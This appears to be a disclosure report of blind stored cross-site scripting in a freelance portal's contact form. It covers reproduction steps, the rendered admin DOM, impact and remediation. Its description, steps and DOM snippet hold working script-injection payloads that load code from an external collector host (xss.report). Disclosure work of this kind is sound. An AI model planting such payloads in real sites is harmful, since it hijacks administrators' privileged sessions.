## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Input Parameters (Name, Phone, and Message Fields) on Freelance Portal Admin Dashboard.

## Affected URL

https://freelance.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the contact form submission handler of the freelance portal. User-supplied input submitted through contact form fields (such as Name, Phone, and Message) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping. 

When an administrative user reviews submitted inquiries within the admin dashboard (`/admin/`), the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application public interface: `https://freelance.pwnedbox.site/#contact`.
2. Locate the project inquiry form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Full Name field, or payloads into Phone and Message fields).
3. Submit the project inquiry form.
4. Log into the administrative control panel where stored inquiries are reviewed (`https://freelance.pwnedbox.site/admin/inquiries.php` or inquiry detail view).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC

<img width="1532" height="1215" alt="image" src="https://github.com/user-attachments/assets/9fe74f39-a125-4152-b7c7-05c952d778b3" />
<img width="1493" height="1173" alt="image" src="https://github.com/user-attachments/assets/6e7e333e-d204-46aa-b373-a44b09ccf8a2" />
<img width="1718" height="1270" alt="image" src="https://github.com/user-attachments/assets/07c4b51a-c67e-41a3-9fb7-08df510cb96e" />

### Vulnerable DOM Snippet

```html
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="../assets/css/style.css"><link rel="stylesheet" href="../assets/css/admin.css"><title>Admin — YourName.dev</title></head><body class="admin-shell">
<aside class="sidebar"><a class="brand" href="../index.php">YourName<span>.dev</span></a><div class="side-user">Administrator</div><nav><a href="index.php">▦ Dashboard</a><a href="inquiries.php">✉ Inquiries</a><a href="../index.php">↗ Website</a><a href="logout.php">↪ Logout</a></nav></aside>
<div class="admin-main"><header class="admin-top"><span>Admin panel</span><a href="../index.php">View website ↗</a></header><div class="admin-content"><div class="page-head"><div><h1>Inquiry #4</h1><p class="muted">09 Nov 2026, 05:52</p></div><a class="small-btn" href="inquiries.php">← All inquiries</a></div>
<div class="detail-grid"><div class="admin-card"><h2>Client details</h2><div class="detail-list"><div><span>Name</span><strong>'"&gt;<script src="https://xss.report/c/vansh"></script></strong></div><div><span>Email</span><a href="mailto:abac@gmail.com">abac@gmail.com</a></div><div><span>Phone</span><a href="tel:'"><script src="https://xss.report/c/vansh"></SCrIpt">'"><SCrIpt src=https://xss.report/c/vansh></SCrIpt</a></div><div><span>Service</span><strong>Full-Stack Development</strong></div><div><span>Budget</span>₹25,000 – ₹50,000</div><div><span>Timeline</span>1–2 weeks</div></div></div>
<div class="admin-card"><h2>Message</h2><p class="message-box">'"><ScriPt src=https://xss.report/c/vansh></script><p></p><h3>Update status</h3><div class="status-actions"><form method="post" action="update-status.php"><input type="hidden" name="csrf_token" value="ca411d257a7cdc80fdaebd04d1769ed6d58c0525272e1d9354081c8f5ba2d7e8"><input type="hidden" name="id" value="4"><input type="hidden" name="status" value="new"><button class="status-btn new" type="submit">New</button></form><form method="post" action="update-status.php"><input type="hidden" name="csrf_token" value="ca411d257a7cdc80fdaebd04d1769ed6d58c0525272e1d9354081c8f5ba2d7e8"><input type="hidden" name="id" value="4"><input type="hidden" name="status" value="read"><button class="status-btn read" type="submit">Read</button></form><form method="post" action="update-status.php"><input type="hidden" name="csrf_token" value="ca411d257a7cdc80fdaebd04d1769ed6d58c0525272e1d9354081c8f5ba2d7e8"><input type="hidden" name="id" value="4"><input type="hidden" name="status" value="contacted"><button class="status-btn contacted" type="submit">Contacted</button></form><form method="post" action="update-status.php"><input type="hidden" name="csrf_token" value="ca411d257a7cdc80fdaebd04d1769ed6d58c0525272e1d9354081c8f5ba2d7e8"><input type="hidden" name="id" value="4"><input type="hidden" name="status" value="closed"><button class="status-btn closed" type="submit">Closed</button></form></div></a></div></div><a href="tel:'">
<form method="post" action="delete.php" class="delete-form" onsubmit="return confirm('Delete this inquiry permanently?');"><input type="hidden" name="csrf_token" value="ca411d257a7cdc80fdaebd04d1769ed6d58c0525272e1d9354081c8f5ba2d7e8"><input type="hidden" name="id" value="4"><button class="danger-btn">Delete inquiry</button></form>
</a></div></div><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script><a href="tel:'">
</a></div></div><iframe class="html2canvas-container" width="1718" height="1270" scrolling="no" data-html2canvas-ignore="true" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;"></iframe></body></html>
```


## Impact

1. Execution of arbitrary JavaScript code within the high-privilege session of an administrator viewing stored inquiries.
2. Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of application data or user accounts.
3. Persistent code execution affecting backend handlers and staff review panels.

## Remediation

1. Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative interfaces or dashboards.
2. Apply strict input validation and sanitization policies on all contact form submission endpoints (Name, Phone, Email, Message fields) to reject or neutralize HTML markup and script tags.
3. Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
